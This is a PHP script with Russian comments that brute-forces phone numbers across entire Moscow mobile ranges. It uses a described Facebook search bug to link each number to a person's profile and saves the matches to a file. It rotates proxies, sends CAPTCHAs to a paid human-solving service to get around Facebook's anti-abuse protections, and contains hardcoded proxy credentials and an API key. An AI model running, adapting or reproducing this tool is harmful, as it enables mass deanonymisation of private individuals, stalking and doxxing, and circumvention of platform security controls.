<?php
/***************************************************
Логика работы следующая. У facebook есть маленький баг, который не заметен с первого взгляда, с помощью него мы получаем информацию о пользователе (фото, ссылка, имя) по номеру телефона. Таким образом задача сводиться к перебору номеров. 
Таргетинг перебора сводиться до операторов мобильной связи, соответственно например для получения всех аккаунтов facebook и сопоставлении их с номерами телефонов необходимо перебрать все мобильные номера Москвы. 
В этом нам помогает сайт http://www.statkod.ru/moskva_mobile1.html , который более того сужает зону перебора до конкретных пулов номеров.
Для больших пулов номеров (>2 000 000) имеет смысл использовать адаптивный перебор. 
В таком случае алгоритм ищет концентрации номеров телефонов, однако находит только 85%-95% аккаунтов.

Главная проблема заключается в том что при большом количестве запросов с одного IP адреса, либо при совпадении информации в cookie файлах при запросе – facebook с завидной регулярностью выдает капчи.
Для решения данной задачи было изучено множество программного обеспечениея которое позволяет решать капчи. Однако приемлимого результата добиться не удалось. 
Лучшее программное обеспечение, лицензия на которое стоит 600$ - решало только 1 из 15 капч такого типа верно. В таком случае facebook всё равно отдавал новые капчи, пока не решит две подряд, а такое бывало только 1 раз.
Таким образом было принято решение что для решения данной необходимо подключать живых людей, которые будут решать данные капчи. 
Были проверены все сервисы предоставляющие такие возможности, лучшим из них оказался https://anti-captcha.com/ , работаем с ними через API, посылая картинку, и отправляя каждые 5 секунд запрос на результат решения капчи. 
Для этого используется библиотека anticaptcha.php.
Стоимость исходя из тестирования на основе перебора 3.5 миллионов номеров телефонов по Москва составила 0.042 рубля за 1 пользователя facebook.

Переходим непосредственно к скрипту.
Скрипт написан на PHP. 

Для более быстрого перебора номеров телефонов используется несколько потоков (parser.php - … - parser11.php)
Каждый поток должен работать со своим файлом cookie и captcha. 
Каждый поток должен работать через свой proxy-сервер, иначе количество капч увеличиться в разы.

Настройки для каждого потока:
$icount=1; // Режим работы 1 - с серверного IP, 2 - через прокси из файла
$tel_code='7952'; //Код телефонного оператора + начало номера
$tel_start=2688946; //Номер от которого перебираем
$tel_end=2688956; //Номер до которого перебираем

***************************************************/


ini_set("max_execution_time", "12000000");
//include 'simple_html_dom.php'; - не используем т.к. без неё - быстрее

$start = microtime(true);


$icount=1; // Режим работы 1 - с серверного IP, 2 - через прокси из файла
$tel_code='7952'; //Код телефонного оператора + начало номера
$tel_start=2688944; //Номер от которого перебираем
$tel_end=2688944; //Номер до которого перебираем

$ic=0;
$nolink=0;
$cc=0;


// Подключение прокси из файла
$lines = file("proxy.txt");
$n=0;

foreach($lines as $line)
{
    $n++;
	$proxym[$n]=$line;
	//echo($n.' - '.$proxym[$n]."<br>");
}

$ic=0;
$proxyn=1;
// Подключение прокси из файла



for ($page = $tel_start; $page <= $tel_end; $page++) {   // Цикл перебора номеров телефонов

$ic++;
if ($ic==100){$proxyn++;$ic=0;}

if ($proxyn>$n) {$proxyn=1;}






$number=$tel_code.$page;
$url = 'https://www.facebook.com/search/top/?q=%2B'.$number;// ссылка по которой обращаемся к фейсбуку
$ch = curl_init();
$header  = array
(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
'Accept-Encoding: gzip, deflate', // указываем серверу, что ответ надо сжимать
'Content-type: application/x-www-form-urlencoded'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_URL, $url); // ссылка по которой обращаемся к фейсбуку
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // следовать за редиректами
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);// таймаут 30 сек
curl_setopt($ch, CURLOPT_REFERER, "http://www.facebook.com/");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// отключаем проверку сертификата
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); // указивает curl что ответ может быть сжат
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

if ($icount==1){
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл
curl_setopt($ch, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');

}
if ($icount==2){
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл
//curl_setopt($ch, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');
$proxy = $proxym[$proxyn];
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, '9WSMLa:kx7fZx');

}


// получаем HTML код страницы
$html = curl_exec($ch); 

//echo $html;

// Ищем капчу
$cap=0;
$captcha = substr(strstr($html, '<div id="captcha" class="'), 25, strlen($html));
$captcha = stristr($captcha, '" data-captcha-class="TFBCaptcha">', true);
if ($captcha=="captcha"){$cap=1;} else {$cap=0;}




// Ищем ссылку на аккаунт если не нашли капчу
if ($cap==0){
$link = substr(strstr($html, 'class="_2s25 _606w" href="'), 26, strlen($html));

$link = stristr($link, '" title="Profile">', true);


$link2 = substr(strstr($html, '"Pages","title":"","className":null},{"href":"'), 30, strlen($html));

$link2 = stristr($link, '","value":"profile"', true);

if (empty($link)) {
$link=$link2;    
}
if(empty($link)){$nolink++;} else {$nolink=0;}





// Пишем результат в файл base.txt
$fp = fopen('base.txt', 'a+'); 
fwrite($fp, $number." ".$link."\r\n");
fclose($fp);
echo $number." ".$link."<br>";
}




if ($nolink>299){
$fp = fopen('base.txt', 'a+'); 
fwrite($fp, $page.' - ');
$page=$page+10000;
fwrite($fp, $page."- EMPTY \r\n");
fclose($fp);
$nolink=0;
}



if ($cap==1){


$result = substr(strstr($html, '<img class="img" src="'), 22, strlen($html));

$result = stristr($result, '" alt="', true);
 }
 
 
 
curl_close($ch);


//
// Если присутствует указание на капчу - загружаем картинку капчи и записываем её в файл
//
if ($cap==1){

$curl = curl_init($result); 
if ($icount==1){
curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл
curl_setopt($curl, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');

}
if ($icount==2){
curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл
curl_setopt($curl, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');
curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($curl, CURLOPT_PROXYUSERPWD, '9WSMLa:kx7fZx');
}
curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'); 
$fp =fopen('captcha.png','w+b'); 
curl_setopt($curl, CURLOPT_FILE, $fp); 
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); 
curl_exec($curl); 
curl_close($curl); 


$img_file = 'captcha.png';
$imgData = base64_encode(file_get_contents($img_file));
$src = 'data: image/png;base64,'.$imgData;
echo '<img src="'.$src.'">';
//
// Если присутствует указание на капчу - загружаем картинку капчи в файл
//


//Подключаем модули распознования капчи
include_once("anticaptcha.php");
include_once("imagetotext.php");

$api = new ImageToText();
$api->setVerboseMode(true);
$api->setKey("6b17e8fee61d7f2072953cc301267b03");
$api->setFile("captcha.png");

//Отправляем капчу на решение
if (!$api->createTask()) {
    $api->debout("API v2 send failed - ".$api->getErrorMessage(), "red");
    return false;
}

$taskId = $api->getTaskId();

//Получаем решение капчи
if (!$api->waitForResult()) {
    $api->debout("could not solve captcha", "red");
    $api->debout($api->getErrorMessage());
} else {
    $captcha_response = $api->getTaskSolution();
    echo "\nhash result: <b>".$captcha_response."</b>\n\n<br>";
}




/////// Сбор данных необходимых для отправки формы с капчей

$lsd = substr(strstr($html, '<input type="hidden" name="lsd" value="'), 39, strlen($html));
$lsd = stristr($lsd, '" autocomplete="off" /><div class="_erp"><div class="_err"><label for="email">', true);
$captcha_persist_data = substr(strstr($html, 'name="captcha_persist_data" value="'), 35, strlen($html));
$captcha_persist_data = stristr($captcha_persist_data, '" /><div>', true);

//Устанавлиаем собранные данные как POST-переменные
$fields = array(
	'lsd' => urlencode($lsd),
	'captcha_persist_data' => urlencode($captcha_persist_data),
	'captcha_response' => urlencode($captcha_response),
	'captcha_submit' => 'Submit'
);


$post_data['lsd'] = $lsd;
$post_data['captcha_persist_data'] = $captcha_persist_data;
$post_data['captcha_response'] = $captcha_response;
$post_data['captcha_submit'] = 'Submit';

foreach ( $post_data as $key => $value) 
{
    $post_items[] = $key . '=' . $value;
}
$post_string = implode ('&', $post_items);




//Отправляем фейсбуку введенную форму с капчей
$url = 'https://www.facebook.com/search/top/?q=%2B'.$number;// //;//; //логин по этой ссылке
$ch = curl_init();
$header  = array
(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
'Accept-Encoding: gzip, deflate', // указиваем серверу, что ответ надо сжимать
'Content-type: application/x-www-form-urlencoded'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_URL, $url); // отправл¤ем на
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36");
curl_setopt($ch, CURLOPT_HEADER, 1); // не включать заголовк в результат запроса
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // следовать за редиректами
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);// таймаут4
curl_setopt($ch, CURLOPT_REFERER, "https://www.facebook.com/search/top/?q=%2B".$number);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// просто отключаем проверку сертификата
if ($icount==1){
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл
curl_setopt($ch, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');

}
if ($icount==2){
curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/cookie.txt'); // сохран¤ть куки в файл
curl_setopt($ch, CURLOPT_COOKIEFILE,  dirname(__FILE__).'/cookie.txt');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, '9WSMLa:kx7fZx');
}
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); // указивает curl что ответ может быть сжат, без этого будут "кракоз¤бры"
curl_setopt($ch, CURLOPT_POST, 1); // использовать данные в post
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$html2 = curl_exec($ch);




curl_close($ch);
$page=$page-1;
$cc++;
}
}
echo 'Время выполнения скрипта: '.round(microtime(true) - $start, 4).' сек. КАПЧ:'.$cc;

?>


